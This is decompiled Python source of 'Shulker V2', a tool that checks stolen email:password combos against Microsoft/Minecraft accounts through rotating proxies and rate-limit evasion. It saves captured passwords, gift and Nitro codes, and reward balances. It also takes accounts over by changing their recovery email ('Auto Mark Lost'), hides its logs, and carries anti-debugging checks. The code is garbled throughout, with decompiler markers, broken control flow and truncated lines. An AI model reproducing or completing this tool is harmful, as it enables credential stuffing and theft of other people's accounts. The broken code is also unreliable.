        nitro = account_data.get('nitro', {})
        if nitro and nitro.get('eligible'):
            nitro_value = []
            status = nitro.get('status', 'Unknown')
            if status == 'claimed':
                nitro_value.append('✅ **CLAIMED**')
                nitro_value.append(f"**Code:** `{nitro.get('promo_code')}`") if nitro.get('promo_code') else nitro_value.append(f"datetime{nitro.get('promo_code')}`")
            if nitro.get('redemption_link'):
                nitro_value.append(f"[Redeem Link]({nitro.get('redemption_link')})")
            fields.append({'name': '💜 Discord Nitro', 'value': '\n'.join(nitro_value), 'inline': False})
        mark_lost = account_data.get('mark_lost', {})
        if mark_lost and mark_lost.get('success'):
            fields.append({'name': '🔄 Auto Mark Lost', 'value': f"✅ Success\n**New Recovery:** {mark_lost.get('new_recovery_email')}", 'inline': False})
        rewards = account_data.get('rewards', {})
        if rewards and rewards.get('available_points', 0) > 0:
            points = rewards.get('available_points')
            fields.append({'name': '💰 MS Rewards', 'value': f'**Balance:** {points:,} points', 'inline': True})
        hypixel = account_data.get('hypixel', {})
        if hypixel:
            hypixel_value = []
            hypixel_value.append(f"**Level:** {hypixel.get('level', 'N/A')}")
            hypixel_value.append(f"**Rank:** {hypixel.get('rank', 'None')}")
            hypixel_value.append('🚫 **BANNED**') if hypixel.get('banned') else None
            fields.append({'name': '⚔️ Hypixel', 'value': '\n'.join(hypixel_value), 'inline': True})
        donut = account_data.get('donut', {})
        if donut:
            donut_value = []
            donut_value.append(f"**Balance:** ${donut.get('balance', 0):,}")
            donut_value.append(f"**Playtime:** {donut.get('playtime_hours', 0)}h")
            donut_value.append('🚫 **BANNED**') if donut.get('banned') else fields.append({'name': '🍩 Donut SMP', 'value': '\n'.join(donut_value), 'inline': True})
        if minecraft.get('profile', {}).get('capes'):
            capes = minecraft['profile']['capes']
            cape_names = []
            if isinstance(capes, list):
                for cape in capes:
                    if isinstance(cape, dict):
                        alias = cape.get('alias', '')
                        if alias:
                            cape_names.append(alias)
                    else:  # inserted
                        if isinstance(cape, str):
                            pass  # postinserted
                        else:  # inserted
                            cape_names.append(cape)
            fields.append({'name': '🎽 Capes', 'value': ', '.join(cape_names), 'inline': False}) if cape_names else fields.append({'name': '🎽 Capes', 'value': ', '.join(cape_names), 'inline': False})
        if minecraft.get('profile', {}).get('name_change_allowed') is not None:
            can_change = minecraft['profile']['name_change_allowed']
            fields.append({'name': '✏️ Can Change Name', 'value': '✅ Yes' if can_change else '❌ No', 'inline': True})
        footer = {'text': f"Shulker V2 • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        footer_icon = self.config.get('embed_footer_icon', '')
        if footer_icon:
            footer['icon_url'] = footer_icon
        embed = {'title': title, 'description': description, 'color': color, 'fields': fields, 'footer': footer, 'timestamp': datetime.utcnow().isoformat()}
        return embed

    def _get_embed_color(self, account_data: Dict) -> int:
        """Determine embed color based on account value"""  # inserted
        nitro = account_data.get('nitro') or {}
        if isinstance(nitro, dict) and nitro.get('eligible'):
            pass  # postinserted
        return 5793266

    def send_summary(self, total: int, hits: int, session_time: str):
        """Send checking summary"""  # inserted
        if not self.enabled:
            pass  # postinserted
        return None

class ProxyManager:
    """Enhanced proxy manager with thorough testing"""

    def __init__(self, config: dict):
        """Initialize proxy manager"""
        self.enabled = config.get('enabled', False)
        self.proxy_file = config.get('file', 'proxies.txt')
        self.proxy_type = config.get('type', 'http')
        self.test_retries = config.get('test_retries', 3)
        self.test_timeout = config.get('test_timeout', 10)
        self.test_url = config.get('test_url', 'https://api.ipify.org')
        self.rotation_mode = config.get('rotation_mode', 'round_robin')
        self.raw_proxies = []
        self.working_proxies = []
        self.failed_proxies = []
        self.proxy_stats = {}
        self.current_index = 0
        self.lock = threading.Lock()
        logger.info(f"🔧 Proxy Manager: {('ENABLED' if self.enabled else 'DISABLED')}")
        self.load_and_test_proxies() if self.enabled else None
        return None

    def load_and_test_proxies(self):
        """Load proxies and test them thoroughly"""
        if not os.path.exists(self.proxy_file):
            logger.error(f'❌ Proxy file not found: {self.proxy_file}')
            logger.error(f'   Create {self.proxy_file} with format: ip:port:user:pass')
            self.enabled = False
        return None

    def _test_proxy_thoroughly(self, proxy: str) -> bool:
        """Test proxy multiple times (3-5) to ensure it works"""
        success_count = 0
        for attempt in range(self.test_retries):
            if self._test_proxy_once(proxy):
                success_count += 1
            time.sleep(0.5)
        required_success = max(2, self.test_retries - 1)
        return success_count >= required_success

    def _test_proxy_once(self, proxy: str) -> bool:
        """Test proxy once"""
        try:
            proxy_dict = self._format_proxy(proxy)
            response = requests.get(self.test_url, proxies=proxy_dict, timeout=self.test_timeout)
            if response.status_code == 200:
                if proxy not in self.proxy_stats:
                    self.proxy_stats[proxy] = {'success': 0, 'failures': 0, 'last_used': 0}
                self.proxy_stats[proxy]['success'] += 1
            return True
        except Exception:
            return False

    def get_proxy(self, sticky_key: Optional[str]=None) -> Optional[Dict[str, str]]:
        """
Get next working proxy

Args:
    sticky_key: For sticky mode (same proxy per email)

Returns:
    Proxy dict for requests, or None if disabled
"""
        if self.enabled and (not self.working_proxies):
            pass
        return None

    def _format_proxy(self, proxy: str) -> Dict[str, str]:
        """
Format proxy for requests library

Supports:
- ip:port
- ip:port:user:pass
- user:pass@ip:port

Returns:
    {'http': 'type://...', 'https': 'type://...'}
"""
        proxy = proxy.strip()
        if '@' in proxy:
            auth, address = proxy.split('@', 1)
            proxy_url = f'{self.proxy_type}://{auth}@{address}'
        return {'http': proxy_url, 'https': proxy_url}

    def _mask_proxy(self, proxy: str) -> str:
        """Mask proxy for safe logging"""
        if ':' in proxy:
            parts = proxy.split(':')
            if len(parts) >= 2:
                return f'{parts[0]}:****'

    def mark_proxy_failed(self, proxy_dict: Optional[Dict[str, str]]):
        """Mark proxy as failed (for future improvements)"""
        if not proxy_dict:
            pass
        return None

    def get_stats(self) -> dict:
        """Get proxy statistics"""
        return {'enabled': self.enabled, 'total_loaded': len(self.raw_proxies), 'working': len(self.working_proxies), 'failed': len(self.failed_proxies), 'current_index': self.current_index}

class RateLimiter:
    """Smart rate limiter with exponential backoff and thread-safe per-domain delays"""

    def __init__(self, global_delay: float=0.5, per_domain: Optional[Dict[str, float]]=None):
        """\nInitialize rate limiter\n\nArgs:\n    global_delay: Global delay between all requests (seconds)\n    per_domain: Dictionary mapping domain to delay (e.g., {\'api.minecraftservices.com\': 2.0})\n"""  # inserted
        self.rate_limited_until = {}
        self.request_counts = {}
        self.last_request = {}
        self.global_delay = global_delay
        self.per_domain = per_domain or {}
        self.lock = threading.Lock()
        self.domain_locks = {}
    pass
    pass
    pass
    def execute_with_retry(self, func: Callable, endpoint_name: str, max_retries: int=5, initial_wait: int=10, max_wait: int=120, *args, **kwargs) -> Any:
        """\nExecute a function with automatic retry on rate limit\n\nArgs:\n    func: Function to execute\n    endpoint_name: Name of endpoint (for tracking)\n    max_retries: Maximum number of retries\n    initial_wait: Initial wait time in seconds\n    max_wait: Maximum wait time in seconds\n    *args: Arguments for func\n    **kwargs: Keyword arguments for func\n\nReturns:\n    Result from func or None if all retries failed\n"""  # inserted
        wait_time = initial_wait
        for attempt in range(max_retries):
            try:
                if endpoint_name in self.rate_limited_until:
                    wait_until = self.rate_limited_until[endpoint_name]
                    if time.time() < wait_until:
                        remaining = int(wait_until - time.time())
                        logger.warning(f'⏳ {endpoint_name} rate limited - waiting {remaining}s...')
                        time.sleep(remaining + 1)
                result = func(*args, **kwargs)
                del self.rate_limited_until[endpoint_name]
                return result
        except Exception as e:
            error_msg = str(e).lower()
            if '429' in error_msg or 'too many' in error_msg or 'rate limit' in error_msg:
                logger.warning(f'⚠️  Rate limit hit on {endpoint_name} (attempt {attempt + 1}/{max_retries})')
                if attempt < max_retries - 1:
                    actual_wait = min(wait_time * 2 ** attempt, max_wait)
                    self.rate_limited_until[endpoint_name] = time.time() + actual_wait
                    logger.info(f'⏳ Waiting {actual_wait}s before retry...')
                    time.sleep(actual_wait)
                else:  # inserted
                    logger.error(f'❌ Max retries ({max_retries}) exceeded for {endpoint_name}')
            raise

    def wait_if_needed(self, endpoint_name: str, min_delay: Optional[float]=None):
        """\nWait if needed to respect rate limits (thread-safe)\n\nArgs:\n    endpoint_name: Name of endpoint or domain (e.g., \'api.minecraftservices.com\')\n    min_delay: Minimum delay between requests in seconds (uses per-domain or global if None)\n"""  # inserted
        min_delay = self.per_domain.get(endpoint_name, self.global_delay) if min_delay is None else min_delay
        with self.lock:
            if endpoint_name not in self.domain_locks:
                self.domain_locks[endpoint_name] = threading.Lock()
            domain_lock = self.domain_locks[endpoint_name]
        with domain_lock:
            current_time = time.time()
            if endpoint_name in self.last_request:
                elapsed = current_time - self.last_request[endpoint_name]
                if elapsed < min_delay:
                    wait_time = min_delay - elapsed
                    if wait_time > 0:
                        time.sleep(wait_time)
            self.last_request[endpoint_name] = time.time()

    def wait_for_domain(self, url: str, min_delay: Optional[float]=None):
        """\nExtract domain from URL and wait if needed\n\nArgs:\n    url: Full URL (e.g., \'https://api.minecraftservices.com/authentication/login_with_xbox\')\n    min_delay: Override delay (uses per-domain or global if None)\n"""  # inserted
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            domain = parsed.netloc
            self.wait_if_needed(domain, min_delay)
        except Exception as e:
            logger.debug(f'Error parsing URL for rate limiting: {e}, using global delay')
            self.wait_if_needed('global', min_delay or self.global_delay)

    def mark_rate_limited(self, endpoint_name: str, wait_seconds: int=60):
        """\nManually mark an endpoint as rate limited\n\nArgs:\n    endpoint_name: Name of endpoint\n    wait_seconds: How long to wait\n"""  # inserted
        self.rate_limited_until[endpoint_name] = time.time() + wait_seconds
        logger.warning(f'⚠️  {endpoint_name} marked as rate limited for {wait_seconds}s')
_rate_limiter = None
_rate_limiter_lock = threading.Lock()

def get_rate_limiter(config: Optional[Dict]=None) -> RateLimiter:
    """\nGet global rate limiter instance (thread-safe singleton)\n\nArgs:\n    config: Optional config dict with \'global_delay\' and \'per_domain\' keys\n\nReturns:\n    RateLimiter instance\n"""  # inserted
    global _rate_limiter  # inserted
    if _rate_limiter is None:
        with _rate_limiter_lock:
            if _rate_limiter is None:
                if config:
                    global_delay = config.get('global_delay', 0.5)
                    per_domain = config.get('per_domain', {})
                    _rate_limiter = RateLimiter(global_delay=global_delay, per_domain=per_domain)
            return _rate_limiter

class SimplifiedCategorizer:
    """Simple result categorization - one folder, many txt files"""

    def __init__(self, session_name: Optional[str]=None):
        """Initialize categorizer with simple structure"""  # inserted
        session_name = f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}" if session_name is None else session_name
        self.session_name = session_name
        self.base_path = os.path.join('results', session_name)
        os.makedirs(self.base_path, exist_ok=True)
        logger.info(f'💾 Results folder: {self.base_path}')
        self.files = {'valid': os.path.join(self.base_path, 'valid.txt'), 'minecraft_hits': os.path.join(self.base_path, 'minecraft_hits.txt'), '2fa_hits': os.path.join(self.base_path, '2fa_hits.txt'), 'auto_mark_lost': os.path.join(self.base_path, 'auto_mark_lost.txt'), 'nitro_claimed': os.path.join(self.base_path, 'nitro_claimed.txt'), 'nitro_unclaimed': os.path.join(self.base_path, 'nitro_unclaimed.txt'), 'gamepass': os.path.join(self.base_path, 'gamepass.txt'), 'gamepass_ultimate': os.path.join(self.base_path, 'gamepass_ultimate.txt'), 'xbox_codes': os.path.join(self.base_path, 'xbox_codes.txt'), 'ms_rewards': os.path.join(self.base_path, 'ms_rewards.txt'), 'hypixel_banned': os.path.join(self.base_path, 'hypixel_banned.txt'), 'hypixel_unbanned': os.path.join(self.base_path,
        self.saved_xbox_codes = set()
        self.saved_hits = set()
        for filepath in self.files.values():
            if not os.path.exists(filepath):
                pass  # postinserted
            else:  # inserted
                open(filepath, 'w', encoding='utf-8').close()

    def save_result(self, account_data: Dict):
        """Save account result to appropriate files"""  # inserted
        try:
            email = account_data.get('email', 'unknown')
            password = account_data.get('password', '')
            if account_data.get('error'):
                pass  # postinserted
            return None
        except Exception as e:
            logger.error(f"Failed to save result for {account_data.get('email')}: {e}")

    def _save_capture(self, account_data: Dict):
        """Save detailed capture of all account info"""  # inserted
        email = account_data.get('email', 'unknown')
        password = account_data.get('password', '')
        capture_text = f"\n{'======================================================================'}\n"
        capture_text += f'ACCOUNT: {email}\n'
        capture_text += f'PASSWORD: {password}\n'
        capture_text += f"CHECKED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        capture_text += f"{'======================================================================'}\n\n"
        security = account_data.get('security', {})
        if security:
            capture_text += '🔒 SECURITY:\n'
            capture_text += f"   Status: {security.get('status', 'N/A')}\n\n"
        minecraft = account_data.get('minecraft', {})
        if minecraft:
            ownership = minecraft.get('ownership', {})
            profile = minecraft.get('profile', {})
            capture_text += '🎮 MINECRAFT:\n'
            capture_text += f"   Java: {('OWNED' if ownership.get('minecraft_java_owned') else 'No')}\n"
            capture_text += f"   Bedrock: {('OWNED' if ownership.get('minecraft_bedrock_owned') else 'No')}\n"
            if ownership.get('minecraft_java_gamepass'):
                capture_text += '   Game Pass: Java\n'
            if ownership.get('minecraft_bedrock_gamepass'):
                capture_text += '   Game Pass: Bedrock\n'
            if profile.get('username'):
                capture_text += f"   Username: {profile.get('username')}\n"
            capes = profile.get('capes', [])
            if capes and isinstance(capes, list):
                cape_names = []
                for cape in capes:
                    if isinstance(cape, dict):
                        pass  # postinserted
                    else:  # inserted
                        alias = cape.get('alias', '')
                        if alias:
                            pass  # postinserted
                        else:  # inserted
                            cape_names.append(alias)
                if cape_names:
                    capture_text += f"   Capes: {', '.join(cape_names)}\n"
            if profile.get('name_change_allowed') is not None:
                capture_text += f"   Can Change Name: {profile.get('name_change_allowed')}\n"
            capture_text += '\n'
        xbox = account_data.get('xbox', {})
        if xbox and xbox.get('gamertag'):
            capture_text += '🎮 XBOX:\n'
            capture_text += f"   Gamertag: {xbox.get('gamertag')}\n\n"
        nitro = account_data.get('nitro', {})
        if nitro and nitro.get('eligible'):
            capture_text += '💜 DISCORD NITRO:\n'
            capture_text += f"   Status: {nitro.get('status', 'N/A').upper()}\n"
            if nitro.get('promo_code'):
                capture_text += f"   Promo Code: {nitro.get('promo_code')}\n"
            if nitro.get('redemption_link'):
                capture_text += f"   Link: {nitro.get('redemption_link')}\n"
            capture_text += '\n'
        mark_lost = account_data.get('mark_lost', {})
        if mark_lost and mark_lost.get('success'):
            capture_text += '🔄 AUTO MARK LOST:\n'
            capture_text += '   Status: SUCCESS\n'
            capture_text += f"   New Recovery: {mark_lost.get('new_recovery_email', 'N/A')}\n\n"
        rewards = account_data.get('rewards', {})
        if rewards and rewards.get('available_points', 0) > 0:
            capture_text += '💰 MS REWARDS:\n'
            capture_text += f"   Balance: {rewards.get('available_points')} points\n\n"
        hypixel = account_data.get('hypixel', {})
        if hypixel and isinstance(hypixel, dict):
            capture_text += '⚔️ HYPIXEL:\n'
            level = hypixel.get('level', 'N/A')
            rank = hypixel.get('rank', 'None')
            banned = hypixel.get('banned', False)
            capture_text += f"   Level: {(str(level) if level!= 'N/A' else 'N/A')}\n"
            capture_text += f"   Rank: {(str(rank) if rank!= 'None' else 'None')}\n"
            capture_text += f'   Banned: {str(banned)}\n\n'
        donut = account_data.get('donut', {})
        if donut and isinstance(donut, dict):
            capture_text += '🍩 DONUT SMP:\n'
            balance = donut.get('balance', 0)
            playtime = donut.get('playtime_hours', 0)
            banned = donut.get('banned', False)
            capture_text += f'   Balance: ${str(balance)}\n'
            capture_text += f'   Playtime: {str(playtime)}h\n'
            capture_text += f'   Banned: {str(banned)}\n\n'
        capture_text += f"{'======================================================================'}\n"
        self._append_to_file('capture', capture_text)

    def _append_to_file(self, file_key: str, content: str):
        """Append content to file"""  # inserted
        try:
            filepath = self.files.get(file_key)
            if filepath:
                with open(filepath, 'a', encoding='utf-8') as f:
                    f.write(content + '\n')
            return
        except Exception as e:
            logger.error(f'Failed to write to {file_key}: {e}')

    def _add_to_all_hits(self, email_pass: str):
        """Add email:pass to all_hits.txt with deduplication"""  # inserted
        normalized = email_pass.lower().strip()
        if normalized and normalized not in self.saved_hits:
            self.saved_hits.add(normalized)
            self._append_to_file('all_hits', email_pass)
            return None

    def add_xbox_code(self, code: str, account_email: str=None):
        """Add Xbox code to codes file - only 25-char codes, no duplicates"""  # inserted
        code_pattern = '([A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5})'
        match = re.search(code_pattern, code.upper())
        if not match:
            matches = re.findall(code_pattern, code.upper())
            if matches:
                extracted_code = matches[0]
        else:  # inserted
            return None
        if extracted_code in self.saved_xbox_codes:
            logger.debug(f'Skipping duplicate Xbox code: {extracted_code}')
        return None

_is_frozen = getattr(sys, 'frozen', False)
if _is_frozen:
    try:
        from src.utils.secure_config import SecureConfigLoader as ConfigLoader
    except ImportError:
        import yaml
        from typing import Any

        class ConfigLoader:
            """Minimal fallback config loader for EXE mode"""

            def __init__(self):
                self.config = {}
                try:
                    possible_paths = [os.path.join(getattr(sys, '_MEIPASS', ''), 'config.yaml'), 'config.yaml']
                    for path in possible_paths:
                        if path and os.path.exists(path):
                            pass  # postinserted
                        else:  # inserted
                            with open(path, 'r', encoding='utf-8') as f:
                                self.config = yaml.safe_load(f) or {}
                                    break
                except:
                    pass  # postinserted
                self.config = {}

            def get(self, key: str, default: Any=None) -> Any:
                keys = key.split('.')
                value = self.config
                for k in keys:
                    if isinstance(value, dict) and k in value:
                        value = value[k]
                    else:  # inserted
                        return default
                else:  # inserted
                    return value

            def set(self, key: str, value: Any):
                keys = key.split('.')
                config = self.config
                for k in keys[:(-1)]:
                    if k not in config:
                        config[k] = {}
                    config = config[k]
                config[keys[(-1)]] = value

            def save(self):
                return

            def get_all(self) -> dict:
                return self.config

            def reload(self):
                self.__init__()
                
shulker_v2_default_key_2024 = "shulker_v2_default_key_2024"

def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encryption"""
    return bytes(a ^ b for a, b in zip(data, itertools.cycle(key)))

def _xor_decrypt(data: bytes, key: bytes) -> bytes:
    """XOR decryption (same as encryption)"""
    return _xor_encrypt(data, key)

def _get_encryption_key() -> bytes:
    """Generate encryption key from HWID"""
    hwid = get_hwid()
    key_hash = hashlib.sha256((hwid + shulker_v2_default_key_2024).encode()).digest()
    return key_hash

def _get_appdata_path() -> Path:
    """
    Get AppData path for storing user config
    win32: %APPDATA%/ShulkerV2
    linux: ~/.config/ShulkerV2
    """
    if sys.platform == "win32":
        appdata = Path(os.getenv("APPDATA"))
    else:
        appdata = Path(os.path.expanduser("~/.config"))
    
    config_dir = appdata / "ShulkerV2"
    if not config_dir.exists():
        config_dir.mkdir(parents=True, exist_ok=True)
    
    return config_dir

def _load_embedded_config() -> dict:
    """
    Load default config from embedded resource (when in EXE)
    """
    # Default Configuration Dictionary structure reconstruction
    default_config = {
        "app_name": "Shulker V2",
        "version": "2.0.0",
        "server_url": "http://de1.bot-hosting.net:21043",
        "gui": {
            "window_width": 1000,
            "window_height": 700,
            "theme": "dark"
        },
        "proxies": {
            "enabled": True,
            "file": "proxies.txt",
            "type": "http"
        },
        "general": {
            "max_threads": 200,
            "checkers": {},     # Structure implied
            "automation": {},   # Structure implied
            "timeouts": {},     # Structure implied
            "retries": {},      # Structure implied
            "rate_limiting": {},# Structure implied
            "resource_monitoring": {}, # Structure implied
            "logging": {},
            "results": {}
        },
        "license": {}
    }

    # If running as frozen executable, try to load from internal resources
    # NOTE: The bytecode contains logic to possibly load from pkgutil or file system
    # but primarily falls back to a hardcoded structure or file load.
    
    # In the provided dump, it constructs the dict literal heavily.
    return default_config

def _load_user_config(user_config_path: Path) -> dict:
    """Load user-modified config from encrypted AppData"""
    if not user_config_path.exists():
        return {}
    
    try:
        key = _get_encryption_key()
        with open(user_config_path, "rb") as f:
            encrypted_data = f.read()
        
        decrypted_data = _xor_decrypt(encrypted_data, key)
        return json.loads(decrypted_data.decode("utf-8"))
    except Exception:
        return {}

def _save_user_config(user_config_path: Path, data: dict):
    """Save user-modified config to encrypted AppData"""
    logger = get_logger()
    try:
        key = _get_encryption_key()
        json_data = json.dumps(data, indent=4)
        encrypted_data = _xor_encrypt(json_data.encode("utf-8"), key)
        
        with open(user_config_path, "wb") as f:
            f.write(encrypted_data)
    except Exception as e:
        logger.warning(f"Could not save user config: {e}")
        print(f"Warning: Could not save user config: {e}")

class SecureConfigLoader:
    """
    Secure configuration loader with embedded defaults and encrypted user settings
    """

    def __init__(self):
        """Initialize secure config loader"""
        self.appdata_path = _get_appdata_path()
        self.user_config_path = self.appdata_path / "config.dat"
        
        self.default_config = _load_embedded_config()
        self.user_config = _load_user_config(self.user_config_path)
        
        self.config = self._merge_configs(self.default_config, self.user_config)

    def _merge_configs(self, default: dict, user: dict) -> dict:
        """
        Merge default config with user config (user config takes precedence)
        """
        result = default.copy()
        
        def deep_merge(target, source):
            for key, value in source.items():
                if key in target and isinstance(target[key], dict) and isinstance(value, dict):
                    deep_merge(target[key], value)
                else:
                    target[key] = value
        
        deep_merge(result, user)
        return result

    def get(self, key: str, default: Any = None) -> Any:
        """
        Get configuration value using dot notation

        Args:
            key: Configuration key (e.g., 'general.app_name')
            default: Default value if key not found

        Returns:
            Configuration value
        """
        keys = key.split(".")
        value = self.config
        
        try:
            for k in keys:
                value = value[k]
            return value
        except (KeyError, TypeError):
            return default

    def set(self, key: str, value: Any):
        """
        Set configuration value using dot notation
        Saves to encrypted user config

        Args:
            key: Configuration key (e.g., 'general.app_name')
            value: Value to set
        """
        keys = key.split(".")
        
        # Update current in-memory config
        current = self.config
        for k in keys[:-1]:
            current = current.setdefault(k, {})
        current[keys[-1]] = value
        
        # Update user config for saving
        user_current = self.user_config
        for k in keys[:-1]:
            user_current = user_current.setdefault(k, {})
        user_current[keys[-1]] = value
        
        self.save()

    def get_all(self) -> dict:
        """Get entire configuration"""
        return self.config

    def reload(self):
        """Reload configuration"""
        self.user_config = _load_user_config(self.user_config_path)
        self.config = self._merge_configs(self.default_config, self.user_config)

    def save(self):
        """
        Save current user configuration to encrypted file
        This method ensures all pending changes are saved
        """
        _save_user_config(self.user_config_path, self.user_config)

    def reset_to_default(self):
        """Reset user config to defaults"""
        if self.user_config_path.exists():
            try:
                os.remove(self.user_config_path)
            except OSError:
                pass
        
        self.user_config = {}
        self.config = self.default_config.copy()

init(autoreset=True)
def _get_logs_dir():
    """\nGet logs directory - hidden from users\nReturns AppData location when running as EXE, or hidden logs folder in dev mode\n"""  # inserted
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        if platform.system() == 'Windows':
            appdata = os.getenv('APPDATA')
            if appdata:
                logs_dir = Path(appdata) / 'ShulkerV2' / 'logs'
    logs_dir.mkdir(parents=True, exist_ok=True)
    if platform.system() == 'Windows':
        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(str(logs_dir), 2)
    return str(logs_dir)
    except:
        pass  # postinserted
    pass

class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors for console output"""
    COLORS = {'DEBUG': Fore.CYAN, 'INFO': Fore.GREEN, 'WARNING': Fore.YELLOW, 'ERROR': Fore.RED, 'CRITICAL': Fore.RED + Style.BRIGHT}

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.levelname = f'{self.COLORS[levelname]}{levelname}{Style.RESET_ALL}'
        return super().format(record)

def setup_logger(name='shulker', level=logging.INFO):
    """\nSetup logger with console handler only (no file logging)\n\nArgs:\n    name: Logger name\n    level: Logging level\n\nReturns:\n    Logger instance\n"""  # inserted
    logger = logging.getLogger(name)
    logger.setLevel(level)
    return logger if logger.handlers else None

def get_logger(name='shulker'):
    """Get existing logger instance"""  # inserted
    return logging.getLogger(name)

class ResourceMonitor:
    """Monitor system resources and adjust threads"""

    def __init__(self, config: dict):
        """
Initialize resource monitor

Args:
    config: Monitoring configuration
"""
        self.enabled = config.get('enabled', True)
        self.check_interval = config.get('check_interval', 5.0)
        self.cpu_threshold = config.get('cpu_threshold', 80.0)
        self.memory_threshold = config.get('memory_threshold', 85.0)
        self.auto_adjust = config.get('auto_adjust', True)
        self.monitoring = False
        self.monitor_thread = None
        self._stop_event = threading.Event()
        self.current_cpu = 0.0
        self.current_memory = 0.0
        self.warnings_issued = 0
        logger.info(f'Resource monitor initialized (enabled={self.enabled})')

    def start_monitoring(self):
        """Start background monitoring thread"""
        if self.enabled and self.monitoring:
            pass
        return None

    def stop_monitoring(self):
        """Stop monitoring thread"""
        if not self.monitoring:
            pass
        return None

    def _monitor_loop(self):
        """Background monitoring loop"""
        if not self._stop_event.is_set():
            try:
                self.current_cpu = psutil.cpu_percent(interval=1)
                self.current_memory = psutil.virtual_memory().percent
                if self.current_cpu > self.cpu_threshold:
                    self.warnings_issued += 1
                    logger.warning(f'⚠️  High CPU usage: {self.current_cpu:.1f}%')
                if self.current_memory > self.memory_threshold:
                    self.warnings_issued += 1
                    logger.warning(f'⚠️  High memory usage: {self.current_memory:.1f}%')
                self._stop_event.wait(self.check_interval)
            except Exception as e:
                logger.error(f'Resource monitoring error: {e}')
                time.sleep(self.check_interval)

    def should_reduce_threads(self) -> bool:
        """
Check if threads should be reduced

Returns:
    True if resource usage is too high
"""
        if self.enabled and (not self.auto_adjust):
            pass
        return False

    def get_recommended_threads(self, current_threads: int) -> int:
        """
Get recommended thread count based on resources

Args:
    current_threads: Current thread count

Returns:
    Recommended thread count
"""
        if not self.enabled or not self.auto_adjust:
            return current_threads

    def get_stats(self) -> dict:
        """Get monitoring statistics"""
        return {'enabled': self.enabled, 'monitoring': self.monitoring, 'cpu_percent': self.current_cpu, 'memory_percent': self.current_memory, 'cpu_threshold': self.cpu_threshold, 'memory_threshold': self.memory_threshold, 'warnings_issued': self.warnings_issued}

    def get_system_info(self) -> dict:
        """Get detailed system information"""
        try:
            cpu_count = psutil.cpu_count()
            cpu_freq = psutil.cpu_freq()
            memory = psutil.virtual_memory()
            return {'cpu_count': cpu_count, 'cpu_physical': psutil.cpu_count(logical=False), 'cpu_freq_current': cpu_freq.current if cpu_freq else 0, 'cpu_freq_max': cpu_freq.max if cpu_freq else 0, 'memory_total_gb': memory.total / 1073741824, 'memory_available_gb': memory.available / 1073741824, 'memory_used_gb': memory.used / 1073741824}
        except Exception as e:
            logger.error(f'Failed to get system info: {e}')
            return {}
global _SECURITY_ENABLED
global _DEBUG_DETECTED
_DEBUG_DETECTED = False
_SECURITY_ENABLED = True

def _is_debugger_present() -> bool:
    """Check if debugger is attached (Windows)"""
    if sys.platform != 'win32':
        pass
    return False

def _check_vm() -> bool:
    """Detect if running in virtual machine"""
    if sys.platform != 'win32':
        pass
    return False

def _check_debug_tools() -> bool:
    """Check for common debugging tools"""
    if sys.platform != 'win32':
        pass
    return False

def _integrity_check() -> bool:
    """Check if executable has been tampered with"""
    if not getattr(sys, 'frozen', False):
        pass
    return True

def _monitor_debugging():
    """Background thread to monitor for debugging"""
    global _DEBUG_DETECTED
    if _SECURITY_ENABLED:
        try:
            if _is_debugger_present():
                _DEBUG_DETECTED = True
                _trigger_protection()
            return None
        except:
            time.sleep(2)

def _trigger_protection():
    """Trigger protection mechanisms when tampering detected"""
    try:
        os._exit(1)
    except:
        try:
            sys.exit(1)
        except:
            return None

def init_security():
    """Initialize security features"""
    if not _SECURITY_ENABLED:
        pass
    return None

def is_debug_detected() -> bool:
    """Check if debugging was detected"""
    return _DEBUG_DETECTED

def disable_security():
    """Disable security (for testing only)"""
    global _SECURITY_ENABLED
    _SECURITY_ENABLED = False

ctk.set_appearance_mode('dark')
ctk.set_default_color_theme('green')
MODERN_COLORS = {'primary': '#2D5F6F', 'primary_hover': '#356F7F', 'primary_dark': '#1D4F5F', 'secondary': '#4A5568', 'accent': '#2D5F6F', 'success': '#3D6F4F', 'warning': '#8B6F2F', 'danger': '#8B4F3F', 'background': '#0F111A', 'background_alt': '#1A1D29', 'surface': '#1E2433', 'surface_alt': '#242B3D', 'surface_hover': '#252E42', 'border': '#2A3441', 'border_accent': '#2D5F6F', 'border_glow': '#2D5F6F40', 'text_primary': '#E8F0F8', '#9CA3AF': {'text_secondary': '#6B7280', 'text_muted': 'transparent'}}
DARK_THEME = {'background': '#0F111A', 'surface': '#1E2433', 'surface_hover': '#252E42', 'border': '#2A3441', 'text_primary': '#E8F0F8', 'text_secondary': '#9CA3AF'}
class StatsTable(ctk.CTkScrollableFrame):
    """Detailed stats table for GUI"""

    def __init__(self, parent, **kwargs):
        kwargs.setdefault('fg_color', DARK_THEME['background'])
        super().__init__(parent, **kwargs)
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        title = ctk.CTkLabel(self, text='📊 Account Statistics', font=('Segoe UI', 18, 'bold'), text_color=DARK_THEME['text_primary'])
        title.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 20), sticky='w')
        self.stat_labels = {}
        self.stats_config = [('📧 Email Domains', [('hotmail_accounts', 'Hotmail'), ('outlook_accounts', 'Outlook'), ('live_accounts', 'Live'), ('gmail_accounts', 'Gmail'), ('other_accounts', 'Other')]), ('🎮 Minecraft Ownership', [('minecraft_java_owned', 'Java Only'), ('minecraft_bedrock_owned', 'Bedrock Only'), ('minecraft_both_owned', 'Java + Bedrock'), ('gamepass_only', 'Game Pass Only'), ('no_minecraft', 'No Minecraft')]), ('🔒 Security Status', [('clean_accounts', 'Clean (No 2FA)'), ('2fa_enabled', '2FA Enabled'), ('security_pending', 'Pending Changes')]), ('🎮 Xbox', [('has_xbox_gamertag', 'Has Gamertag')]), ('🔄 Auto Mark Lost', [('mark_lost_success', 'Success'), ('mark_lost_failed', 'Failed'), ('mark_lost_skipped', 'Skipped (No Java)')]), ('💰 MS Rewards', [('
        self._build_table()

    def _build_table(self):
        """Build the stats table"""  # inserted
        current_row = 1
        for category, stats in self.stats_config:
